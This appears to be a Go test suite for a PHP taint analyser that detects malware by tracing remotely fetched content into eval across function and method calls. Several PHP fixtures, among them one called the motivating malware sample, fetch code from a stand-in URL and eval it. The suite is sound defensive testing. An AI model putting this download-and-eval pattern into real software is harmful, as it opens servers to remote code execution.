package phptaint

import (
	"context"
	"fmt"
	"maps"
	"slices"
	"sort"
	"strings"
	"testing"

	"github.com/VKCOM/php-parser/pkg/ast"
)

func summariesOf(t *testing.T, src string) (summaryTables, []string) {
	t.Helper()
	root, status, reason := parseSource([]byte(src))
	if status != StatusAnalyzed {
		t.Fatalf("parse status %v: %s", status, reason)
	}
	tables, loss, err := functionSummaries(context.Background(), collectScope(root))
	if err != nil {
		t.Fatalf("function summaries: %v", err)
	}
	return tables, loss
}

func TestSummaryMarksDirectlyReturningFunction(t *testing.T) {
	got, _ := summariesOf(t, "<?php function g($u) { return file_get_contents($u); }")
	if _, ok := got.funcs["g"]; !ok {
		t.Errorf("funcs = %v, want g marked taint-returning", got.funcs)
	}
}

func TestSummaryPropagatesThroughCallChain(t *testing.T) {
	got, _ := summariesOf(t, `<?php
function a($u) { return file_get_contents($u); }
function b($u) { return a($u); }
function c($u) { $t = b($u); return $t; }`)
	names := make([]string, 0, len(got.funcs))
	for n := range got.funcs {
		names = append(names, n)
	}
	sort.Strings(names)
	want := []string{"a", "b", "c"}
	if len(names) != len(want) {
		t.Fatalf("funcs = %v, want %v", names, want)
	}
	for i := range want {
		if names[i] != want[i] {
			t.Fatalf("funcs = %v, want %v", names, want)
		}
	}
}

func TestSummaryTerminatesOnMutualRecursion(t *testing.T) {
	got, _ := summariesOf(t, `<?php
function p($u) { return q($u); }
function q($u) { return p($u); }`)
	if len(got.funcs) != 0 || len(got.methods) != 0 {
		t.Errorf("funcs = %v, methods = %v, want none: neither function reaches a source", got.funcs, got.methods)
	}
}

func TestSummaryIgnoresFunctionThatOnlyEchoes(t *testing.T) {
	got, _ := summariesOf(t, "<?php function g($u) { echo file_get_contents($u); }")
	if _, ok := got.funcs["g"]; ok {
		t.Errorf("funcs = %v, want g absent: it returns nothing", got.funcs)
	}
}

func TestPrecisionLossIsRecorded(t *testing.T) {
	_, loss := summariesOf(t, "<?php function g() { $n = 'x'; $$n = 1; extract($a); call_user_func($f); }")
	joined := strings.Join(loss, " ")
	for _, want := range []string{"variable-variable", "extract", "dynamic-call"} {
		if !strings.Contains(joined, want) {
			t.Errorf("precision loss = %q, want %q recorded", joined, want)
		}
	}
}

// TestSummaryMarksMotivatingSample reproduces the real malware shape this
// task exists for: the fetch and the sink live in different functions, so
// without a summary for fetchContent the flow from curl_exec to eval is
// invisible to a single-scope analysis.
func TestSummaryMarksMotivatingSample(t *testing.T) {
	got, _ := summariesOf(t, `<?php
function fetchContent($url) { $ch = curl_init($url); return curl_exec($ch); }
$content = fetchContent('http://host/p.txt');
eval('?>' . $content);`)
	if _, ok := got.funcs["fetchcontent"]; !ok {
		t.Errorf("funcs = %v, want fetchcontent marked taint-returning", got.funcs)
	}
}

// TestSummaryPropagatesThroughLongCallChain builds a call chain longer than
// the fixed round cap (16) a call chain could once walk past undetected,
// with dependencies discovered in the worst order (each function calls the
// next, so a caller only learns its callee's summary in the round after the
// callee itself converges). That fixed cap evaded detection on exactly this
// shape once already for the intraprocedural fixpoint; the interprocedural
// one must not repeat it.
func TestSummaryPropagatesThroughLongCallChain(t *testing.T) {
	const n = 21
	var src strings.Builder
	src.WriteString("<?php\n")
	for i := 0; i < n; i++ {
		fmt.Fprintf(&src, "function f%d($u) { return f%d($u); }\n", i, i+1)
	}
	fmt.Fprintf(&src, "function f%d($u) { return file_get_contents($u); }\n", n)
	got, _ := summariesOf(t, src.String())
	if _, ok := got.funcs["f0"]; !ok {
		t.Errorf("funcs omitted the head of a %d-hop call chain", n+1)
	}
}

// TestSummaryMarksMethodAndPropagatesThroughCall proves methods participate
// in the same interprocedural fixpoint as functions: a method that reaches a
// source is itself summarized, and a plain function calling it through
// $obj->fetch() picks up that taint via the method namespace.
func TestSummaryMarksMethodAndPropagatesThroughCall(t *testing.T) {
	got, _ := summariesOf(t, `<?php
class A {
	function fetch($u) { return curl_exec($u); }
}
function caller($obj, $u) {
	$x = $obj->fetch($u);
	return $x;
}`)
	if _, ok := got.methods["fetch"]; !ok {
		t.Errorf("methods = %v, want A::fetch marked taint-returning", got.methods)
	}
	if _, ok := got.funcs["caller"]; !ok {
		t.Errorf("funcs = %v, want caller tainted via ->fetch()", got.funcs)
	}
}

// TestFunctionAndMethodSameNameDoNotContaminate is the load-bearing
// regression for the namespace-collapse false positive: a method and a
// plain function share the bare name "shared", but only the method reaches
// a source. A third function calls the PLAIN function (not the method) by
// its unqualified name. With a single shared summary map, the method's
// taint would leak into the "shared" key and falsely taint every caller of
// the plain function too; with separate namespaces it must not.
func TestFunctionAndMethodSameNameDoNotContaminate(t *testing.T) {
	got, _ := summariesOf(t, `<?php
class B {
	function shared($u) { return curl_exec($u); }
}
function shared($x) { return $x; }
function callsPlainFunction($x) {
	$y = shared($x);
	return $y;
}`)
	if _, ok := got.methods["shared"]; !ok {
		t.Errorf("methods = %v, want B::shared marked taint-returning", got.methods)
	}
	if _, ok := got.funcs["shared"]; ok {
		t.Errorf("funcs = %v, want plain shared() NOT tainted: it only returns its own argument", got.funcs)
	}
	if _, ok := got.funcs["callsplainfunction"]; ok {
		t.Errorf("funcs = %v, want callsPlainFunction NOT tainted: it calls the plain shared(), not B::shared", got.funcs)
	}
}

// TestAmbiguousMethodNameOmittedAndRecorded: two unrelated classes
// declaring the same method name must not resolve to either one's
// definition (that would be an arbitrary guess), so the name is dropped
// from the method table entirely and the gap is recorded rather than
// silently favoring whichever class collectScope saw first.
func TestAmbiguousMethodNameOmittedAndRecorded(t *testing.T) {
	got, loss := summariesOf(t, `<?php
class C1 {
	function get($u, $f) {
		$n = 'x';
		$$n = 1;
		extract($u);
		compact('n');
		call_user_func($f);
		return curl_exec($u);
	}
}
class C2 { function get($u) { return $u; } }`)
	if _, ok := got.methods["get"]; ok {
		t.Errorf("methods = %v, want get omitted: declared by two classes", got.methods)
	}
	wantLoss := []string{"ambiguous-method", "compact", "dynamic-call", "extract", "variable-variable"}
	if !slices.Equal(loss, wantLoss) {
		t.Errorf("precision loss = %q, want %q", loss, wantLoss)
	}
}

func TestAmbiguousMethodPastSummaryLimitIsRecorded(t *testing.T) {
	facts := newScopeFacts()
	for i := 0; i < maxSummarizedFuncs; i++ {
		facts.funcs = append(facts.funcs, &ast.StmtFunction{
			Name: &ast.Identifier{Value: []byte(fmt.Sprintf("f%d", i))},
		})
	}
	for range 2 {
		facts.methods = append(facts.methods, &ast.StmtClassMethod{
			Name: &ast.Identifier{Value: []byte("shared")},
		})
	}

	_, loss, err := functionSummaries(context.Background(), facts)
	if err != nil {
		t.Fatalf("function summaries: %v", err)
	}
	if !slices.Equal(loss, []string{"ambiguous-method"}) {
		t.Errorf("precision loss = %q, want ambiguous-method past summary limit", loss)
	}
}

func TestPrecisionLossAtSummaryLimitIsRecorded(t *testing.T) {
	var src strings.Builder
	src.WriteString("<?php\n")
	for i := 0; i < maxSummarizedFuncs-1; i++ {
		fmt.Fprintf(&src, "function f%d() {}\n", i)
	}
	src.WriteString(`function included($a, $f) {
	$n = 'x';
	$$n = 1;
	extract($a);
	compact('n');
	call_user_func($f);
}`)

	_, loss := summariesOf(t, src.String())
	wantLoss := []string{"compact", "dynamic-call", "extract", "variable-variable"}
	if !slices.Equal(loss, wantLoss) {
		t.Errorf("precision loss = %q, want %q at summary limit", loss, wantLoss)
	}
}

func TestPrecisionLossRecheckedInSummarizedBody(t *testing.T) {
	root, status, reason := parseSource([]byte(`<?php function included($a, $f) {
	$n = 'x';
	$$n = 1;
	extract($a);
	compact('n');
	call_user_func($f);
}`))
	if status != StatusAnalyzed {
		t.Fatalf("parse status %v: %s", status, reason)
	}
	collected := collectScope(root)
	facts := newScopeFacts()
	facts.funcs = collected.funcs

	_, loss, err := functionSummaries(context.Background(), facts)
	if err != nil {
		t.Fatalf("function summaries: %v", err)
	}
	wantLoss := []string{"compact", "dynamic-call", "extract", "variable-variable"}
	if !slices.Equal(loss, wantLoss) {
		t.Errorf("precision loss = %q, want %q from independently collected body", loss, wantLoss)
	}
}

// summaryBodyEvalsFor builds a reverse-ordered call chain of n functions
// (f0 calls f1, f1 calls f2, ..., the last reaches a source directly -- the
// worst discovery order, since each caller only learns its callee's summary
// after the callee itself has been evaluated) and reports how many times
// functionSummaries evaluated a body while summarizing it.
func summaryBodyEvalsFor(t *testing.T, n int) int64 {
	t.Helper()
	var src strings.Builder
	src.WriteString("<?php\n")
	for i := 0; i < n-1; i++ {
		fmt.Fprintf(&src, "function f%d($u) { return f%d($u); }\n", i, i+1)
	}
	fmt.Fprintf(&src, "function f%d($u) { return curl_exec($u); }\n", n-1)

	root, status, reason := parseSource([]byte(src.String()))
	if status != StatusAnalyzed {
		t.Fatalf("parse status %v: %s", status, reason)
	}
	before := summaryBodyEvals.Load()
	_, _, err := functionSummaries(context.Background(), collectScope(root))
	if err != nil {
		t.Fatalf("function summaries: %v", err)
	}
	return summaryBodyEvals.Load() - before
}

// TestSummaryBodyEvalCountIsLinearInChainLength is the structural guard for
// the interprocedural fixpoint's cost, the same kind of counter-based
// invariant TestDeclarationTreeBuildCountIsIndependentOfDeclarationCount
// uses for declaration indexing rather than timing, which is flaky under
// shared CI load. A round-robin sweep re-checks every body on every pass
// until nothing changes, which costs O(n^2) body evaluations for a
// reverse-ordered chain of n bodies (up to n passes, each visiting all n
// bodies). A worklist keyed on the call graph only re-evaluates a body when
// the one callee it depends on actually changed, so the same chain costs
// O(n): one evaluation per body up front, plus at most one more per body as
// the change propagates one hop at a time. 10x the chain length must cost
// roughly 10x the evaluations, not roughly 100x.
func TestSummaryBodyEvalCountIsLinearInChainLength(t *testing.T) {
	const small, large = 40, 400
	smallEvals := summaryBodyEvalsFor(t, small)
	largeEvals := summaryBodyEvalsFor(t, large)

	ratio := float64(largeEvals) / float64(smallEvals)
	if ratio > 30 {
		t.Fatalf("body evals at %d hops = %d, at %d hops = %d (ratio %.1f) - want roughly linear scaling (~10x), not quadratic (~100x)",
			small, smallEvals, large, largeEvals, ratio)
	}
}

func TestFunctionSummariesChecksContextBeforeEachBody(t *testing.T) {
	facts := mustParse(t, "<?php function first() {} function second() {}")
	ctx := newCancelOnErrCheck(2)
	t.Cleanup(ctx.cancel)

	_, _, err := functionSummaries(ctx, facts)
	if err != context.Canceled {
		t.Fatalf("error = %v, want context.Canceled", err)
	}
}

// permutations returns every ordering of items. Declaration order is
// attacker-controlled, so a property that must hold for one ordering must hold
// for all of them.
func permutations(items []string) [][]string {
	if len(items) <= 1 {
		return [][]string{append([]string(nil), items...)}
	}
	var out [][]string
	for i := range items {
		rest := make([]string, 0, len(items)-1)
		rest = append(rest, items[:i]...)
		rest = append(rest, items[i+1:]...)
		for _, tail := range permutations(rest) {
			out = append(out, append([]string{items[i]}, tail...))
		}
	}
	return out
}

// reportFingerprint renders the parts of a Report a caller acts on, in a form
// that is stable across orderings so two runs can be compared directly.
func reportFingerprint(r Report) string {
	results := make([]string, 0, len(r.Results))
	for _, res := range r.Results {
		results = append(results, fmt.Sprintf("%s->%s[%d]%v", res.Source, res.Sink, res.Confidence, res.Identifiers))
	}
	sort.Strings(results)
	loss := append([]string(nil), r.PrecisionLoss...)
	sort.Strings(loss)
	return fmt.Sprintf("status=%d total=%d results=%v loss=%v truncated=%t",
		r.Status, r.TotalResults, results, loss, r.EvidenceTruncated)
}

// TestAnalysisIsIndependentOfDeclarationOrder pins the property the
// interprocedural fixpoint exists to provide: a monotone fixpoint's result is
// determined by the call graph, never by the order the bodies happen to be
// written in. An attacker chooses that order freely, so any dependence on it
// is an evasion -- moving one function above another would be enough to go
// dark. The wrapper here reaches its callee from inside a closure within a
// return, which is the shape where the body's own facts and the facts consulted
// when evaluating its return expression disagree about which calls exist.
func TestAnalysisIsIndependentOfDeclarationOrder(t *testing.T) {
	decls := []string{
		"function fetchRemote($c){ return curl_exec($c); }\n",
		"function wrapClosure($c){ return (function() use ($c) { return fetchRemote($c); })(); }\n",
		"function passThrough($c){ return wrapClosure($c); }\n",
	}
	tail := "$payload = passThrough($c);\neval($payload);\n"

	var want string
	for i, order := range permutations(decls) {
		src := "<?php\n"
		for _, d := range order {
			src += d
		}
		src += tail
		got := reportFingerprint(Analyze(context.Background(), []byte(src)))
		if i == 0 {
			want = got
			continue
		}
		if got != want {
			t.Fatalf("declaration order changed the result:\n first order: %s\n this  order: %s\n source:\n%s", want, got, src)
		}
	}
	if !strings.Contains(want, "eval") {
		t.Fatalf("expected the flow to be detected in every order, got %s", want)
	}
}

// sweepSummaries is a reference fixpoint that ignores the call graph
// entirely: it re-evaluates EVERY body until a full pass changes nothing.
// It is deliberately the naive, obviously-correct implementation, so that
// comparing the production worklist against it tests the thing a worklist can
// actually get wrong -- not whether it terminates or how fast it is, but
// whether its edges wake every body an update can affect. Any missing edge
// shows up here as a lower summary than the sweep reaches.
func sweepSummaries(t *testing.T, bodies []funcBody) summaryTables {
	t.Helper()
	tables := summaryTables{funcs: map[string]Confidence{}, methods: map[string]Confidence{}}
	for pass := 0; ; pass++ {
		if pass > len(bodies)+2 {
			t.Fatalf("reference sweep failed to settle after %d passes", pass)
		}
		changed := false
		for _, b := range bodies {
			if b.name == "" {
				continue
			}
			best, found, err := evalBodySummary(context.Background(), b, tables)
			if err != nil {
				t.Fatalf("reference sweep: %v", err)
			}
			if !found {
				continue
			}
			target := tables.funcs
			if b.kind == bodyMethod {
				target = tables.methods
			}
			if cur, ok := target[b.name]; ok && cur >= best {
				continue
			}
			target[b.name] = best
			changed = true
		}
		if !changed {
			return tables
		}
	}
}

// TestWorklistMatchesExhaustiveSweep is the equivalence gate. The worklist
// replaced a round-robin sweep purely to bound work, so it must reach the
// SAME fixpoint; anything less is a silent false negative rather than an
// optimisation. Each case is also run in every declaration order, because a
// missing edge can be masked by an order that happens to evaluate callees
// before their callers.
func TestWorklistMatchesExhaustiveSweep(t *testing.T) {
	cases := []struct {
		name  string
		decls []string
	}{
		{"callee inside a closure in a return", []string{
			"function fetchRemote($c){ return curl_exec($c); }\n",
			"function wrapClosure($c){ return (function() use ($c) { return fetchRemote($c); })(); }\n",
		}},
		{"callee inside an arrow function in a return", []string{
			"function fetchRemote($c){ return curl_exec($c); }\n",
			"function wrapArrow($c){ return array_map(fn($x) => fetchRemote($c), [1]); }\n",
		}},
		{"callee inside a nested function declaration in a return", []string{
			"function fetchRemote($c){ return curl_exec($c); }\n",
			"function wrapNested($c){ if (!function_exists('inner')) { function inner($c){ return fetchRemote($c); } } return inner($c); }\n",
		}},
		{"chain through a method call", []string{
			"class Loader { public function grab($c){ return curl_exec($c); } }\n",
			"function useLoader($l, $c){ return (function() use ($l, $c) { return $l->grab($c); })(); }\n",
		}},
		{"mutual recursion with a closure hop", []string{
			"function alpha($c){ return (function() use ($c) { return beta($c); })(); }\n",
			"function beta($c){ if ($c) { return alpha($c); } return curl_exec($c); }\n",
		}},
		{"plain chain, no nesting", []string{
			"function fetchRemote($c){ return curl_exec($c); }\n",
			"function middle($c){ return fetchRemote($c); }\n",
			"function outer($c){ return middle($c); }\n",
		}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			for _, order := range permutations(tc.decls) {
				src := "<?php\n"
				for _, d := range order {
					src += d
				}
				root, status, reason := parseSource([]byte(src))
				if status != StatusAnalyzed {
					t.Fatalf("parse status %v: %s", status, reason)
				}
				facts := collectScope(root)
				bodies, _, err := summaryBodies(context.Background(), facts)
				if err != nil {
					t.Fatalf("summaryBodies: %v", err)
				}
				want := sweepSummaries(t, bodies)
				got, err := solveSummaries(context.Background(), bodies)
				if err != nil {
					t.Fatalf("solveSummaries: %v", err)
				}
				if !maps.Equal(want.funcs, got.funcs) || !maps.Equal(want.methods, got.methods) {
					t.Fatalf("worklist disagrees with exhaustive sweep\n sweep:    funcs=%v methods=%v\n worklist: funcs=%v methods=%v\n source:\n%s",
						want.funcs, want.methods, got.funcs, got.methods, src)
				}
			}
		})
	}
}
